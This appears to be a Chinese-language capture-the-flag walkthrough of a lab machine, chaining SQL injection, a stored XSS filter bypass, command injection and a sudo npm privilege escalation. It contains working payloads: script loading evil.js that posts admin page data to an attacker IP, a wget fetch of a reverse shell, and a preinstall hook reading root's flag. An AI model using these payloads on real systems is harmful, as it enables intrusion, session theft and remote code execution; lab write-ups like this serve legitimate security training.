## 解题流程


1\. 在登录那里可以对用户名进行爆破，当输入为`username`的时候，返回真实的用户名

解完题后从从源码进行分析：
```
var query = 'SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "' + req.body.username +'"))';
```
正常输入`username`会返回`False`，但是这里是`sqlite`，当输入的值等于列名的时候，返回了`true`

```sql
┌──(kali㉿kali)-[~]
└─$ sqlite3                                                                                                               127 ⨯
SQLite version 3.38.1 2022-03-12 13:37:29
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open test.db
sqlite> CREATE TABLE users (
   ...> id INTEGER PRIMARY KEY AUTOINCREMENT,
   ...> username TEXT,
   ...> password TEXT,
   ...> active TINYINT(1));
sqlite> INSERT INTO users VALUES(NULL, "RickA", "password", 1);
sqlite> select * from users;
1|RickA|password|1
sqlite> select id, username, password, active from users where (active=1 AND (username="username"));
1|RickA|password|1
sqlite> select id, username, password, active from users where (active=1 AND (username="username1"));

```

在`mysql`中，则返回`false`

```
MariaDB [holiday]> select id, username, password, active from users where (active=1 AND (username="username"));
Empty set (0.001 sec)

MariaDB [holiday]> describe users;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(11)      | NO   | PRI | NULL    |       |
| username | varchar(255) | YES  |     | NULL    |       |
| password | varchar(255) | YES  |     | NULL    |       |
| active   | int(11)      | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
4 rows in set (0.001 sec)
```

所以这里造成了当用户输入相同的列名的时候，返回真


2\. 使用`sqlmap`扫描登录数据包，判断是否有注入

```
+----+---+--------+----------------------------------+----------+
| id | 1 | active | password                         | username |
+----+---+--------+----------------------------------+----------+
| 1  | 1 | 1      | fdc8cd4cff2c19e0d1022e78481ddf36 | RickA    |
+----+---+--------+----------------------------------+----------+
```

3\. 在`note`留言界面，管理员会对这些留言进行批准才能显示，所以这里明显是一个存储`xss`

过滤规则如下，看到白名单就是`img`标签的`src`属性

```js
var xssFilter = new xss.FilterXSS({
  whiteList: {
    img: ['src']
  },
  onTagAttr: function (tag, name, value, isWhiteAttr) {
    if (name === 'src' && isWhiteAttr) return name + '=' + value.replace(/["' ]/g, '') + '';
    return null;
  }
});
```


4\. 尝试一些字符后，对`<>`进行了过滤，但是输入`<img>`的时候就不会过滤，所以使用`<img>`的攻击向量配合`eval`函数。

```js
<img src="x/><script>eval(String.fromCharCode(payload))</script>">

// payload
document.write('<script src="http://1.2.3.4/evil.js"></script>');

// evil.js
var url = "http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65";
$.ajax({method: "GET", url: url,success: function(data){$.post("http://10.10.14.8:8000/", data)}});

// nc -v -lp 8000
```

5\. 当提交后批准通过，则可以收到管理员发送过来的页面数据

```html
<input type="hidden" name="cookie" value="connect.sid=s:81a51910-d6b8-11ec-9cac-a504fac79240.DAng57xUlXIka83qTfn8CLQbgB4k2FjOyh/UvjEeoVs
```

6\. 使用`cookie`登录成功，在`export`接口存在命令注入

源码如下：

```js
exec('sqlite3 hex.db SELECT\\ *\\ FROM\\ ' + filteredTable, function(err, stdout, stderr) {
      res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
      res.header('Expires', '-1');
      res.header('Pragma', 'no-cache');
      res.attachment('export-' + req.query.table + '-' + (+new Date()));
      res.send(stdout);
    })
```
代码中使用了`exec`来执行命令，实际上会执行以下命令
```
spawnargs: [ '/bin/sh', '-c', 'sqlite3 test.db select\\ *\\ from\\ table' ]
```

```
%2f%26whoami
```
当尝试其他命令时候，存在过滤
```
Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed
```

直接使用`wget`下载一个反弹`shell`并执行，对`ip`地址进行进制转换
```
%2f%26wget%20168431112/reverse
```

6\. 得到`shell`后在当前用户目录下得到`user.txt`

7\. 执行`sudo -l`，可以得到当前用户能够以管理员权限运行`sudo npm i`，也就是能够安装一个`npm`包，可以使用`package.json`的`script`功能执行命令

```json
{
  "name": "npm-package-example",
  "version": "0.0.0-development",
  "description": "This is a simple npm package example",
  "main": "dist/index.js",
  "scripts": {
      "preinstall": "cat /root/root.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt"
  },
  author: "xxx"
}
```

然后指定目录安装包

```
sudo npm i /path/to/packags.json/ --unsafe
```